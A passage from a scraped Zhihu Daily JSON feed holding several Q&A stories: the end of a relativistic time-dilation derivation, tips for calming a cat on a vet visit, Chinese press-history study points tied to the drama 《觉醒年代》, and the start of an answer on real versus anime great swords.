src=\"https://www.zhihu.com/equation?tex=%5CDelta+t_%7B%E4%BF%AE%7D\" alt=\"\"></p>\n<p>与</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctheta\" alt=\"\"></p>\n<p>的函数关系已与原方程明显不同，但结果近似。</p>\n<hr>\n<p>在计算角速度时，如果不直接用</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=d%5Ctau_%7B%E8%B5%A4%7D\" alt=\"\"></p>\n<p>替换</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=dt\" alt=\"\"></p>\n<p>，则应在角速度后配上系数</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cfrac%7Bd%5Ctau_%7B%E8%B5%A4%7D%7D%7Bdt%7D\" alt=\"\"></p>\n<p>，即</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=-%5Cfrac%7Bd%5Ctau_%7B%E8%B5%A4%7D%5E%7B2%7D%7D%7Bdt%5E%7B2%7D%7D%3D-%5Cleft%28+1-%5Cfrac%7B2GMR_%7B%E8%B5%A4%7D%7D%7Bc%5E%7B2%7D%5Crho_%7B%E8%B5%A4%7D%5E%7B2%7D%7D+%5Cright%29-%5Cfrac%7B4aGM%7D%7Bc%5E%7B4%7D%5Crho_%7B%E8%B5%A4%7D%5E%7B2%7D%7Du_%7B%E8%B5%A4%7D%5Cfrac%7Bd%5Ctau_%7B%E8%B5%A4%7D%7D%7Bdt%7D%2B%5Cfrac%7B1%7D%7Bc%5E%7B2%7DR_%7B%E8%B5%A4%7D%5E%7B2%7D%7D%5Cleft%5B+%5CDelta_%7B%E8%B5%A4%7D+%2B%5Cfrac%7B2GMR_%7B%E8%B5%A4%7D%5Cleft%28+R_%7B%E8%B5%A4%7D%5E%7B2%7D%2B%5Cfrac%7Ba%5E%7B2%7D%7D%7Bc%5E%7B2%7D%7D+%5Cright%29%7D%7Bc%5E%7B2%7D%5Crho_%7B%E8%B5%A4%7D%5E%7B2%7D%7D+%5Cright%5Du_%7B%E8%B5%A4%7D%5E%7B2%7D%5Cfrac%7Bd%5Ctau_%7B%E8%B5%A4%7D%5E%7B2%7D%7D%7Bdt%5E%7B2%7D%7D\" alt=\"\"></p>\n<p>，</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Crho_%7B%E8%B5%A4%7D\" alt=\"\"></p>\n<p>、</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5CDelta_%7B%E8%B5%A4%7D\" alt=\"\"></p>\n<p>为代入地球赤道半径</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=R_%7B%E8%B5%A4%7D\" alt=\"\"></p>\n<p>的值。</p>\n<p>解关于</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cfrac%7Bd%5Ctau_%7B%E8%B5%A4%7D%7D%7Bdt%7D\" alt=\"\"></p>\n<p>的二次方程，得</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cfrac%7Bd%5Ctau_%7B%E8%B5%A4%7D%7D%7Bdt%7D%3D%5Cfrac%7B%5Cfrac%7B4aGM%7D%7Bc%5E%7B4%7D%5Crho_%7B%E8%B5%A4%7D%5E%7B2%7D%7Du_%7B%E8%B5%A4%7D%2B%5Csqrt%7B%5Cfrac%7B16a%5E%7B2%7DG%5E%7B2%7DM%5E%7B2%7D%7D%7Bc%5E%7B8%7D%5Crho_%7B%E8%B5%A4%7D%5E%7B4%7D%7Du_%7B%E8%B5%A4%7D%5E%7B2%7D%2B4%5Cleft%28+1-%5Cfrac%7B2GMR_%7B%E8%B5%A4%7D%7D%7Bc%5E%7B2%7D%5Crho_%7B%E8%B5%A4%7D%5E%7B2%7D%7D+%5Cright%29%5Cleft%5C%7B+1%2B%5Cfrac%7B1%7D%7Bc%5E%7B2%7DR_%7B%E8%B5%A4%7D%5E%7B2%7D%7D%5Cleft%5B+%5CDelta_%7B%E8%B5%A4%7D%2B%5Cfrac%7B2GMR_%7B%E8%B5%A4%7D%5Cleft%28+R_%7B%E8%B5%A4%7D%5E%7B2%7D%2B%5Cfrac%7Ba%5E%7B2%7D%7D%7Bc%5E%7B2%7D%7D+%5Cright%29%7D%7Bc%5E%7B2%7D%5Crho_%7B%E8%B5%A4%7D%5E%7B2%7D%7D+%5Cright%5Du_%7B%E8%B5%A4%7D%5E%7B2%7D+%5Cright%5C%7D%7D%7D%7B2%5Cleft%5C%7B+1%2B%5Cfrac%7B1%7D%7Bc%5E%7B2%7DR_%7B%E8%B5%A4%7D%5E%7B2%7D%7D%5Cleft%5B+%5CDelta_%7B%E8%B5%A4%7D%2B%5Cfrac%7B2GMR_%7B%E8%B5%A4%7D%5Cleft%28+R_%7B%E8%B5%A4%7D%5E%7B2%7D%2B%5Cfrac%7Ba%5E%7B2%7D%7D%7Bc%5E%7B2%7D%7D+%5Cright%29%7D%7Bc%5E%7B2%7D%5Crho_%7B%E8%B5%A4%7D%5E%7B2%7D%7D+%5Cright%5Du_%7B%E8%B5%A4%7D%5E%7B2%7D++%5Cright%5C%7D%7D\" alt=\"\"></p>\n<p>（舍去负值解）。</p>\n<p>求出</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cfrac%7Bd%5Ctau_%7B%E8%B5%A4%7D%7D%7Bdt%7D\" alt=\"\"></p>\n<p>后，再带入原方程求出</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cfrac%7Bd%5Ctau_%7B%E7%A9%BA%7D%7D%7Bdt%7D\" alt=\"\"></p>\n<p>，便可进一步得到该问题的最终解。可以看到，这样不换元直接求解非常繁琐，而结果的精度并没有显著改变，所以一般采用</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=d%5Ctau_%7B%E8%B5%A4%7D\" alt=\"\"></p>\n<p>替换</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=dt\" alt=\"\"></p>\n<p>的方式求解。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/465743677\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737840"},{"title":"想带猫猫去医院，需要做些什么来缓解它的压力，避免应激？","date":"2021-07-06 23:07:50","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-81f3b2e490759fadccd2ddbc999eaeaa_l.jpg?source=8673f162\"><span>八只包子，</span><span>有只猫，日系家居爱好者，猫叫伊吹你懂的，很高兴遇见你呀✨</span>\n<a href=\"https://www.zhihu.com/question/469076067/answer/1973626764\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>猫咪介绍：</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-06ffe387f38c719a0f3e1f4c2eec0822_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我家猫伊吹，两岁妹妹，家养已绝育。</p>\n<p>典型母猫性格，胆小敏感且机警。典型加菲猫怂样，遇到不乐意的事情只会默默反抗，不叫不闹不打人。</p>\n<p><strong>一、准备猫包 / 航空箱：</strong></p>\n<p>1.有家长随便抱着猫、用纸箱端着就去看医生了，最好不要，这是有潜在危险的哦。</p>\n<p>2.猫遇到外界刺激可能会剧烈挣扎，甚至伤人逃脱，所以为保安全请务必准备好猫包 / 航空箱。</p>\n<p>3.猫包 / 航空箱最好选透气好的，不要全透明的，结实的，易清洗的，就医完及时清洁消毒。</p>\n<p><strong><strong>【几种常见的猫包 / 航空箱简评】：</strong></strong></p>\n<p>1.全透明猫包（不推荐！）</p>\n<p>这种猫包当时凭借颜值吸引了好多人种草，可是它没有透气孔，全暴露又容易让猫咪没有安全感，所以非常不推荐！</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-710a1e01efa06da5fd019622fd3ba418_720w.jpg?source=8673f162\" alt=\"\"></figure><p>2.最常见的航空箱（自用款性价比高）</p>\n<p>这种款式是最容易买到的航空箱，价格也便宜，性价比很高，塑料材质清洗方便，不会像书包那样粘毛。但就诊时猫咪会不肯出来，铲屎官也难以将猫抱出（比如我），也算是一个缺点吧。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-70291274960f402ee2c421f3b42ff3e3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>3.可“开口”航空箱</p>\n<p>所以我建议还没买航空箱的家长，可以看看这种中途能打开的款式，个人感觉是最佳就医航空箱。可以折叠便于收纳，平时在家里放着也不会占地方。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3bd4341f559e1074ab328c6068a65c96_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>二、如何把猫骗进笼子：</strong></p>\n<p>1.平常在家不建议猫包 / 航空箱收起来，放出来提前让猫咪习惯它的存在。</p>\n<p>2.在家看见它进去了就奖励一点零食，让猫知道“进去会有不错的体验”，正所谓 100 次进航空箱，98 次体验都是 good，只有 2 次是 bad，何乐不为呢！</p>\n<p><strong>【我的经历】：</strong>平时我的航空箱就摆在客厅，随便伊吹进去玩儿。所以想把猫骗进箱子简直是小菜一碟，我丢了个冻干在里头，伊吹扭着橘色大屁股立马就挤进去了，so easy！</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8877211f319e5611e85a370a0f141aed_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>三、辅助安抚用品（从高到低）：</strong></p>\n<p>1.<strong>猫咪爱的零食</strong>和猫条是必备的，猫在极度压力下可能会不吃。</p>\n<p>2.虽然我们口口声声说<strong>猫条</strong>都是诱食剂不要喂，但在就医情况下，诱惑最大的猫条才是哄猫王者。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-75a56cb17b2ca27bed398a1e528d1b1a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>3.充满猫咪气味的<strong>毛巾和小毯子</strong>可以带一带，必要时候把猫“卷起来”有奇效。</p>\n<p>4.如果猫咪出门极度激动可以问医生是否能使用<strong>加巴喷丁（镇静作用）</strong>，药店可以买到的人用药，亲测有效，但需要掌握好用药剂量。</p>\n<p>5.<strong>费利威（安抚效果）</strong>喷雾可以来一点，讲到缓解猫咪应激反应宠物医生会推荐的用品，不过安抚效果因猫而异，有可能无效哦。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d124efa88fb01e8dd01ebdd89a16610c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>辅助安抚用品大合集</figcaption></figure><p><strong><strong>【我的经历 / 用品推荐】：</strong></strong></p>\n<p>1.上面图片大家也能看到，我用猫猫平时最爱的冻干骗伊吹是完全没用的，必须要上诱惑力强的咕噜酱 or 猫条，流体食物想混药也比较方便。</p>\n<p>2.我在就诊前 30 分钟用咕噜酱混了一点加巴喷丁（此处不做医疗建议）给伊吹吃，于是整个就诊过程中异常顺利。其实猫就是蔫巴了，压根无力反抗...</p>\n<p>3.不想喂药的家长我更推荐费利威喷雾，但是它的安抚效果并不稳定，同时价格还不便宜，99 一瓶刷刷刷就没了。</p>\n<p>and 哪怕是国产的小壳费乐舒也要 69/ 只，所以大家根据实际情况酌情购入吧。</p>\n<p><strong>四、路途 / 排队中安抚：</strong></p>\n<p>去医院最好就是私家车自驾啦，其次是滴滴，可以在箱子盖一条充满猫咪气味的毛巾哦，忘带了也可以用铲屎官的衣服代替。</p>\n<p>比如我的衬衫：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8a90d75146140b40e9c7f1b332771190_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-ec8f09cf2b50cc8ccea1e366b0ad26d2_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>五、抱出笼子检查：</strong></p>\n<p>这对我家爱躲猫猫的伊吹来说是个老大难问题，爪爪死死扣住底板，倒也倒不出来，而且航空箱又无法中途打开，就只能温柔温柔再温柔的由主人把它抱出来了...</p>\n<p><strong>六、检查期间安抚：</strong></p>\n<p>1.如果是性格温柔，也就是吓到动都不敢动的猫咪，那主人在场安抚真的会好一点。</p>\n<p>2.如果是性格造孽上蹿下跳嗷嗷叫拆诊疗室的猫咪，那就.......没办法了，听医生的吧！</p>\n<p>3.不过，遇到凡事不要慌，保持冷静，不要焦虑，猫是能察觉到人的心情的哦~</p>\n<p><strong>【我的经历】：</strong>伊吹因为吃了药以及本身就很怂的缘故，检查一动不动，超级无敌配合，不过我还是一直都在诊室陪着。</p>\n<p>比如偶尔轻轻叫它名字抱抱它：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-6e562fa0bb9ec35948d119b361748eae_720w.jpg?source=8673f162\" alt=\"\"></figure><p>比如剃毛的时候撸撸小脑瓜安抚：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-2834ac26c27cb1f25de6e4b40e67fb59_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>七、检查完，麻溜走人（猫）！</strong></strong></p>\n<p>最后？哪还有最后哇。</p>\n<p>认真遵医嘱，该检查该治疗，没事的话结账完赶紧回家，快速回到熟悉的地方就是猫咪缓解压力最好的方式！</p>\n<p>之所以会有这么多图片，原因就是我上周末刚带了猫去检查心脏。个人认为定期体检还是很有必要的，想进一步了解的小伙伴可戳：</p>\n<p><a href=\"https://www.zhihu.com/question/397418185/answer/1972044907\">有多少人会每年给猫做体检，甚至做生化和心脏彩超？</a></p>\n<p><strong>希望去医院的小猫咪都能不用住院，</strong></p>\n<p><strong>身体棒棒，赶紧回家，嗷嗷嗷喵喵喵！</strong></p>\n<hr>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/469076067\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737827"},{"title":"《觉醒年代》中有哪些知识点？","date":"2021-07-06 23:07:45","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-0930a1e80722113e563ead364519ddf5_l.jpg?source=8673f162\"><span>是古米呀，</span><span>新传考研三跨上岸，懒癌晚期，努力分享ing</span>\n<a href=\"https://www.zhihu.com/question/461865970/answer/1976409939\" hidden>阅读原文</a>\n</div>\n<div>\n<p>想从新闻史的角度谈谈《觉醒年代》中有哪些考点呢！</p>\n<p>以下知识点按照《觉醒年代》<strong>剧集时间线出场或出现的先后顺序排列</strong>，图片皆截图自爱奇艺。</p>\n<p><strong>1、癸丑报灾</strong></p>\n<p><strong>重要指数：☆☆☆☆☆</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-bdb3a7559ba901caf1374a445b63aef0_720w.jpg?source=8673f162\" alt=\"\"></figure><p>1913 年（癸丑年）袁世凯为达到专制独裁的目的，派人刺杀了宋教仁，以孙中山为首的革命党人为此发动了“二次革命”，各地报纸随即兴起了反袁浪潮。</p>\n<p>在大量的报刊声讨之下，袁世凯开始向新闻界发起大规模的摧残。北京、上海、武汉、长沙等地的国民党报刊和反袁报刊被扣上“乱党报纸”的罪名而遭到查禁。</p>\n<p>袁世凯采取了多种手段压制国民言论，创立了《亚细亚日报》、《金刚报》等报刊为自己的反动舆论喉舌，并用各种方式收买了一些报刊为自己所用，同时制定《出版法》等法令限制新闻自由，并通过残暴的方式大肆打压报业与残害进步报人。<strong>（手段）</strong></p>\n<p>在袁世凯的参保镇压下，1913 年的民国报纸由民初的 500 多家锐减到 130 余家，大量报人遭到迫害。<strong>（结果）</strong></p>\n<p>1913 年正逢农历癸丑年，当时新闻出版人将这一年报纸遭受的浩劫称为“癸丑报灾”，称袁世凯为“报刊屠夫”。该年同时也被新闻史上认为是 1949 年中华人民共和国成立前新闻史上最为黑暗的一年。</p>\n<p><strong>2、李大钊</strong></p>\n<p><strong>重要指数：☆☆☆</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-6813402d952e74ed8b8cf67e01bc9d61_720w.jpg?source=8673f162\" alt=\"\"></figure><p>李大钊是我国无产阶级新闻活动的先驱，早期接触的马克思主义宣传家，中国共产党创始人之一。</p>\n<p>1.早年留学日本，1916 年回国后积极参与《新青年》的编撰工作。</p>\n<p>2.1918 年在《新青年》发表了《庶民的胜利》、《布尔什维克的胜利》等文章，是我国最早有关马克思主义的文献。他指导了《晨报》副刊的改革。</p>\n<p>3.1920 年带领观中共北京小组创办了《劳动音》。</p>\n<p>4.中国共产党成立后和大革命时期，指导创办《工人周刊》、《国民新报》等，并为《新青年》季刊、《向导》撰稿。</p>\n<p><strong>3、陈独秀</strong></p>\n<p><strong>重要指数：☆☆☆☆</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-da995240b9b04f534e430fe73414b8d0_720w.jpg?source=8673f162\" alt=\"\"></figure><p>陈独秀是我国著名的民主革命家，新文化运动的倡导者之一，中国共产党早期领导人。</p>\n<p>1.青年时代受康梁维新变法思想的影响，抛弃官宦旧图，追求西方新学，曾多次赴日本求学考察。</p>\n<p>2.在国内外组织团体、创办报社，宣传民主思想，反对君主专制。</p>\n<p>3.1903 年在上海与章士钊等人创办《国民日报》，担任编辑。</p>\n<p>4.1904 年在芜湖与友人创办《安徽俗话报》，第一次担任报纸主编。</p>\n<p>5.后参加辛亥革命，并积极参加反袁斗争，二次革命失败后，逃亡日本，协助章士钊编辑《甲寅》杂志。</p>\n<p>6.1915 年回国，认识到开展思想革命的重要性，创办了《新青年》揭开了新文化运动的序幕。</p>\n<p><strong>4、保皇派与革命派的论战</strong></p>\n<p><strong>重要指数：☆☆☆☆☆☆</strong>（加一⭐因为考研政治也是重点）</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-698db00b1724f00c7d8b806efb094544_720w.jpg?source=8673f162\" alt=\"\"></figure><p>1906-1907 年间，革命派与保皇派报刊之间兴起一场大规模的论战，双方投入的报刊多达几十种，其中<strong>以《民报》和《新民丛报》之间的交战为主</strong>。</p>\n<p>《民报》创刊之际便向《新民丛报》主动发起进攻，对康梁等人主张保皇、实行君主立宪等观点进行了批驳。</p>\n<p>双方论战的焦点同时也是革命派和改良派的政治主张，主要有以下四点：</p>\n<p><strong>第一，要不要进行民族革命，推翻清朝统治？</strong></p>\n<p>《新民丛报》反对实行种族革命，否认满清政府实行民族压迫，认为满人已同化于汉人， 排满必然引起民族相互厮杀，造成天下大乱，因而主张拥戴皇帝进行自上而下的改革。</p>\n<p>《民报》则认为，清政府对内实行民族压迫，对外奉行卖国政策，所以要救国就必须进行民族革命，用武力推翻清政府。</p>\n<p><strong>第二，要不要进行民权革命，建立共和政体？</strong></p>\n<p>《新民丛报》认为，中国国民长期处于专制政体之下，既没有自治的能力，也不懂团体的公益，只知各营其私，不具备共和国公民的资格，因此只能在中国实行君主立宪或开明专 制。</p>\n<p>《民报》则认为必须进行政治革命，君主专制下国家秩序和人民权利无法保证，自由、 平等、博爱是人类共有的精神，国民完全有民权立宪能力，应废除君主，建立民主共和国。</p>\n<p><strong>第三，要不要进行社会革命，土地国有，平均地权？</strong></p>\n<p>《新民丛报》认为中国不同与欧美的贫富差距到不得不革命的地步，当务之急是“生产 问题”，而非“分配问题”。土地国有将会导致生产停滞，报酬平等、遏制劳动冬季、带来政府滥用职权。</p>\n<p>《民报》则认为，中国已有放任自由竞争、绝对承认私有财产的制度，那将必然会产生 贫富差距，不如趁早进行社会革命，关键就是实行土地国有，是国家成为土地的主人，人人 根据需要租用土地。</p>\n<p><strong>第四，革命会不会导致内乱和瓜分？</strong></p>\n<p>《新民丛报》认为，革命将会带来极大的危险，旧政府既倒而新政府未能成立之时，将会“内乱并起，战祸不休，血流成河，民不聊生，而外侮乘之，遂至亡国灭种。”</p>\n<p>《民报》宣称革命事业以建设为目的，破坏只是它的手段。革命知识推翻清政府，并不排外，因此不会导致内乱和瓜分之祸。如果不革命，中国会越来越弱，那才会导致瓜分之祸。</p>\n<p><strong>5、《新青年》</strong></p>\n<p><strong>重要指数：☆☆☆☆☆</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-e5ee480199e6224b34d93c331fd36568_720w.jpg?source=8673f162\" alt=\"\"></figure><p>《新青年》是五四时期最重要的刊物，是新文化运动的主阵地，它的创办标志着新文化运动的开始。于 1915 年 9 月由陈独秀创办于上海，<strong>创刊时名为《青年杂志》，第二卷起改名为《新青年》。</strong>宗旨是“与青年诸君商榷将来所以修身治国之道”。</p>\n<p>《新青年》在历史上的地位和贡献可以分为三个阶段：</p>\n<p><strong>1915-1917：陈独秀主撰阶段</strong></p>\n<p>a.提倡自由民主，反对封建礼教，开展批孔运动，将反对封建主义与反对封建礼教结合起来，是《新青年》的这一时期的主要宣传特点。</p>\n<p>《新青年》第一篇批孔文章是易白沙的长篇政论《孔子平论》；1916 年至 1917 年，陈独秀在《新青年》发表了《驳康有为致总统总理书》、《宪法与礼教》、《孔子之道与现代生活》、《袁世凯复活》等文章，这些文章猛烈抨击尊孔逆流，大力批判儒家思想，掀起了一场批孔运动；鲁迅在《新青年》上刊载的第一篇白话小说《狂人日记》，也深刻地揭露了封建礼教的 “吃人本质”。</p>\n<p>b.提倡科学，反对盲目、愚昧、迷信，主张用科学原则和理性解决一切问题</p>\n<p>《新青年》杂志发表了一系列有关达尔文进化论、爱因斯坦相对论以及唯物论、无神论等文章，宣扬科学文化知识，包括陈独秀的《偶想破坏论》和易白沙的《诸子无鬼论》等。</p>\n<p>c.提倡文学革命运动，提倡新文化，反对旧文化</p>\n<p>《新青年》杂志发表胡适的《文学改良刍议》，拉开了文学革命的帷幕，后又发表陈独秀的《文学革命论》，大力推进白话文运动。</p>\n<p><strong>1918-1920：编辑部同人轮流主编阶段</strong></p>\n<p>a.1918 年 12 月，《新青年》发表了李大钊的《庶民的胜利》和《布尔什维克的胜利》 两篇文章，是我国最早有关马克思主义的文献，标志着《新青年》由民主主义刊物向社会 主义刊物过渡。</p>\n<p>b.五四运动前夕，《新青年》开辟了“马克思主义研究专号”，李大钊发表了长篇论文《我的马克思主义观》，第一次比较系统地向民众介绍了马克思主义。</p>\n<p>c.五四运动之后，《新青年》开辟了“劳动节纪念专号”，发表了陈独秀的《劳动者的觉悟》、李大钊的《MAY DAY 运动史》，是其宣传马克思主义与工人运动相结合的起点。</p>\n<p>d.后李大钊在《新青年》上与胡适的《每周评论》进行了“问题与主义”的争论，激烈 抨击改良主义的社会改造方案，论证革命主张，扩大了马克思主义的社会影响。</p>\n<p><strong>1920-1922：中国共产党上海发起组机关刊物阶段（改组）</strong></p>\n<p>a.改组后的《新青年》明确表示了拥护马列主义的态度，由陈独秀主编，发表了《谈政治》，拥护无产阶级革命和无产阶级专政。</p>\n<p>b.杂志开辟了《俄罗斯研究》专栏，介绍了大量有关俄国革命理论的现实资料。李大钊发表了《俄罗斯革命之过去及现在》，详细介绍了俄国政府及其领袖列宁。这些译介资料满 足了当时先进知识份子的迫切需求，也是马克思主义在中国得到了进一步的传播。</p>\n<p><strong>6、北京大学新闻学研究会</strong></p>\n<p><strong>重要指数：☆☆☆☆☆</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-83c847dfe3bd3272b3b67c3f330ac185_720w.jpg?source=8673f162\" alt=\"\"></figure><p>北京大学新闻学研究会是<strong>我国最早的新闻教育和研究机构，也是我国新闻教育的发端。</strong>1918 成立于北京，初名为“北京大学新闻研究会”，由邵飘萍积极倡议、北大校长蔡元培出面发起组织，蔡元培任学会会长，徐宝璜担任研究会副会长，是实际的会务负责人。</p>\n<p>北京大学新闻学研究会在提倡新文学研究、培养新闻人才方面起到了重要的开拓作用， 其培养的许多会员成为五四以后创办的新文化报刊的骨干。戈公振在《中国报学史》中称该 学会为我国“报业教育之发端”。</p>\n<p><strong>7、邵飘萍与《京报》</strong></p>\n<p><strong>重要指数：☆☆☆☆☆</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7579ef03173fdb6e76f98119ed947ced_720w.jpg?source=8673f162\" alt=\"\"></figure><p>邵飘萍，民初著名记者、报人，中国新闻理论的开拓者与奠基人，以新闻采访著称，在评论、通讯写作、报业经营、学术研究和新闻教育等方面都有突出贡献，被后人誉为 “新闻全才”、“铁肩辣手”等。</p>\n<p>《京报》由邵飘萍 1918 年创办于北京，中华民国初年有影响力的民办报纸之一。</p>\n<p>1.办报目的：作为“改良我国新闻事业之试验，为社会发表意见之机关，“必使政府听命于正当民意”。</p>\n<p>2.着重报道和评述政局、战事，时效性强。详尽报道五四运动、五卅惨案、1926 年的“三一八”惨案，并从经济上、舆论上支持被害者。</p>\n<p>3.1919 年因触怒段祺瑞政府，报纸被查封，邵飘萍再次被迫流亡日本。1920 年段祺瑞下台，回北京恢复《京报》。</p>\n<p>4.5 年内《京报》有计划地完成了报社机构业务革新，包括版面及排字印刷的改造，并于多滴设置分馆和派驻记者。</p>\n<p>1925 年报馆迁入自建的二楼馆舍，是当时北京唯一由自建馆舍的报纸。</p>\n<p>1926 年，邵飘萍被奉系军阀以“赤化宣传”的罪名逮捕并杀害，《京报》被迫停刊。</p>\n<p><strong>8、《每周评论》</strong></p>\n<p><strong>重要指数：☆☆☆☆</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-823ea9b9a49cf017d3a56bb3c67bd1ce_720w.jpg?source=8673f162\" alt=\"\"></figure><p>《每周评论》1918 年 12 月创办于北京，是陈独秀、李大钊等《新青年》同人为适应新的形势而创办的一份<strong>时事政治评论报纸，</strong>四开四版。</p>\n<p>《每周评论》前 20 期由李大钊主编，全力支持“新青年”提倡新文化、反对旧文化的 运动，宣传反帝反封建思想，倾向社会主义；后由胡适主编，转而倾向改良主义立场，挑起 了“问题与主义”的斗争，沦为宣传实用主义的舆论工具。</p>\n<p><strong>9、《湘江评论》</strong></p>\n<p><strong>重要指数：☆☆☆☆</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-be9b5e27b62e4255174ebec8b991ca3e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>《湘江评论》是湖南学生联合会的机关刊物，是宣传新思想的重要阵地，1919 年创办于湖南长沙，毛泽东担任主编。</p>\n<p>毛泽东在该报发表了著名的《论民众的大联合》一文，同时积极宣传俄国十月革命及其影响，并将五四运动和十月革命联系起来，将反帝反封建的政治斗争和对孔子的思想批判 斗争结合起来。</p>\n<p>《湘江评论》具有广泛的影响，李大钊评论该刊为全国最有分量、见解最深的报纸。</p>\n<p><strong>10、《天津学生会联合报》</strong></p>\n<p>《天津学生会联合报》是五四时期重要的新思想宣传阵地，天津学生联合会的机关刊物，1919 年创办于天津，由周恩来主编。</p>\n<p>《天津学生联合会报》销量曾高达两万多份，远销北京、上海、南京等地，广大读者称 赞该报是天津的“新曙光”，评价它是“全国学生会报之冠”，与《湘江评论》南北呼应， 并肩战斗，成为五四时期宣传新思想的重要阵地。</p>\n<p><strong>结语</strong></p>\n<p>《觉醒年代》巧妙地情节设置和生动细致的人物塑造，让伟人的每一个动作，每一个对话场景，每一个历史事件都不再仅仅“活”在教科书本之中。曾经宏大宣传中先烈们触不可及的“前台”形象，被演员们呈现给我们接地气的“后台”形象冲淡。在这里，他们永远是敢为人先，不畏强权，无畏牺牲的翩翩少年。</p>\n<p>6 月 10 日晚，第 27 届上海电视节白玉兰奖揭晓，《觉醒年代》斩获最佳男主角、最佳导演和最佳原创编剧三项大奖，成为此届“最大赢家”，带着“中新史”出圈的同时也提醒我们在今年新传考研重要重视剧中所涉及的相关知识点。</p>\n<p>恰逢网友们对该剧的一条热门评论：“《觉醒年代》有续集吗？”——“你现在的幸福生活就是续集。”</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/461865970\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737826"},{"title":"有没有在动漫中被扭曲了形象的兵器？","date":"2021-07-06 23:07:40","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-afadfd2fed640cf410f2b19af0f28c35_l.jpg?source=8673f162\"><span>勃然大怒，</span><span>只是一名普通的渔民</span>\n<a href=\"https://www.zhihu.com/question/340122227/answer/996734516\" hidden>阅读原文</a>\n</div>\n<div>\n<p>看到大家都在谈弱化长兵器，弱化弓弩，过分吹嘘刀剑，以及各种奇怪的盔甲之类的，我来提一嘴传说中的巨剑（比如 Claymore 和 Zweihander）</p>\n<p>（在下第一次写知乎回答，请多多指教啦）</p>\n<p><strong>这是真正的<em>大剑 Claymore</em></strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-83e203f20f669d650b38e2f01e5b04f0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Claymore</figcaption></figure><p>Claymore（威廉华莱士的那把，不是克蕾亚的那把），也称四环大剑，因为十字护手的尖上有四个环得名。这玩意更像是加长加粗版的长剑，剑长 120 到 140cm，重量一般也就两公斤略重于长剑，剑刃宽阔，技法貌似也接近长剑。和 Zweihander 不同的是它长的还比较正常，没有脱离老祖宗骑士剑的形制太多......</p>\n<p><strong>这是真正的 Zweihander 自慰汉</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-28d0ea43a9e39a0c557b15118a948641_720w.jpg?source=8673f162\" alt=\"\"><figcaption>一大群外形粗犷的自慰汉</figcaption></figure><p>zweihander 则比较奇怪，长度能干到 160，某些极端的 180 都有，重量范围也很大，2 到 6kg 都有（4kg 以上的那些我认为不实用，更像是礼器），不仅需要怪物级的力量，体格也必须足够高大才能使用。它最大的特点是宽阔的大护手，护手上方一小段不开刃（有些还包了皮革之类的可以手握）这一小段上方是格挡勾，上方的剑刃一般比 claymore 窄厚，可能是为了戳刺性能，但也有一些为了提高劈砍威力把剑刃做成了焰形。技法基本已经失传，但我不认为这把武器适合当作普通的剑去使用，它更像是一把可以顺便砍一砍人，还有一堆护手的长枪......</p>\n<p>现实中的巨剑除了平淡无奇的 Claymore，外形粗犷充满狂野美的 Zweihander，还有外形优美的西班牙巨剑 Montante 等等</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-f08594ee00b29d428210153bcbb32ba8_720w.jpg?source=8673f162\" 